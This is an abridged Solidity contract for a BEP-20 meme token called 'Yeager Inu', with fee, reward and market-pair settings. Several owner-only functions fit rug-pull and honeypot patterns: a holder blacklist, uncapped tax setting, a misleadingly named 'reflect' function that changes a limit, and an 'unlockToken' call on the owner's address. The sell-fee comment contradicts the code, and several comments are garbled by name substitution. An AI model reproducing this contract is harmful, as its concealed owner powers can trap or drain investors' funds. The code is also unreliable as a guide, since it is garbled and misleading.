...
interface IERC20 {
	 ...
	 * This allows applications to reconstruct the allowance for all YeagerInu just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also YeagerInued.
	...
	// File: contracts/YeagerInuBEP20PayingToken.sol
	...
	contract YeagerInu is ERC20, Ownable {
		using SafeMath for uint256;
        ...
        address payable private mktFund = payable(msg.sender);   
        ...
        */
		...
		currentTaxes public _currentTaxes = currentTaxes({
        burn: 1,
        dev: 10,
        mkt: 10,
        rfl: 4,
		...
		uint256 private mkt;
		uint256 private rfl;
		uint256 private totalTaxPercent;
		...
		event excludeMultipleAccountFromRewards(address[] YeagerInu, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private newLimit = 100000000000000000 * (10**18); 
		...
		constructor() ERC20("Yeager Inu", "YEAGER"){
			...
			totalTaxPercent = _burn + _dev + _mkt + _rfl;
			...
			emit SetIsFeeExempt(mktFund, true);
		...
		function excludeFromFee(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "YeagerInu: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function excludeFromReward(address account, bool excluded) public onlyOwner {
			require(_isLiquidityPool[account] != excluded, "YeagerInu: Account is already the value of 'excluded'");
			_isLiquidityPool[account] = excluded;
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "YeagerInu: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "YeagerInu: Automated market maker pair is already set to that value");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "YeagerInu: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "YeagerInu: Cannot update distributorGas to same value");
		...
		function reflect(uint256 tAmount) external onlyOwner() {
            newLimit = tAmount * 10**9;
        ...
        function setTaxes (uint256 _burn, uint256 _dev, uint256 _mkt, uint256 _rfl) external onlyOwner {
            burn = _burn;
            dev = _dev;
			mkt = _mkt;
			rfl = _rfl;
		  ...
		  function setBlacklistAccount(address[] calldata addresses, bool value) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = value;
        }
		} 
	
		function revertTax() external onlyOwner() {
        ...
        function unlockToken(uint256 Timestamp) external onlyOwner {
			_unlockToken(msg.sender, Timestamp);

        }
    
	
        function _unlockToken(address account, uint256 Timestamp) internal virtual {
		...
		function _transfer(
			...
			if(
				...
				uint256 swapTokens = contractTokenBalance.mul(burn).div(totalTaxPercent);
			...
			if(takeFee) {
				uint256 fees = amount.mul(totalTaxPercent).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(dev).div(100);
				}
